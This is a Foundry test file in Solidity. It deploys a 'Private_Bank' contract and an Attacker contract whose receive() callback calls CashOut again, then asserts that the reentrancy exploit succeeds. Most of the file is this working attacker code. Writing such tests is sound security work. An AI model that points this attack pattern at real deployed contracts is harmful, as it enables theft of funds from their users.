
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Private_Bank, Log} from "../src/Private_Bank.sol";

contract TestReentrancyPrivate_Bank is Test {

    Private_Bank public _contractUnderTest;
    Log public transferLog;
    Attacker public _attacker;

    function setUp() public {
        transferLog = new Log();
        _contractUnderTest = new Private_Bank(address(transferLog));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.5 ether);
        vm.assume(attackVal <= type(uint256).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Private_Bank public bank;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;
    uint256 public reentrantSnapshot;

    constructor(address victimAddress) { 
        bank = Private_Bank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackAmount = val;
        bank.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = bank.balances(address(this));

        bank.CashOut(attackAmount);

        if (reentrantSnapshot == initialSnapshot && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            reentrantSnapshot = bank.balances(address(this));
            attackCallCount++;
            bank.CashOut(attackAmount);
        }
    }
}
